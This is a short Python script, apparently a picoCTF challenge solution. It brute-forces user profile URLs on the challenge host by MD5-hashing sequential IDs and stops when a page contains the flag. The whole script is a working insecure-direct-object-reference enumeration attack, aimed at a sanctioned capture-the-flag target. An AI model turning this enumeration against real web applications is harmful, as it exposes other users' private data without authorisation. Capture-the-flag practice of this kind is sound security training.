import requests
import hashlib

target_url = "http://crystal-peak.picoctf.net:54082/profile/user/"

for i in range(3001 , 5000):
    url = target_url + hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(url)
    print(f"[*] {i}. status: {r.status_code}")
    if "picoctf{" in r.text.lower() or "flag" in r.text.lower():
        print(r.text)
        break
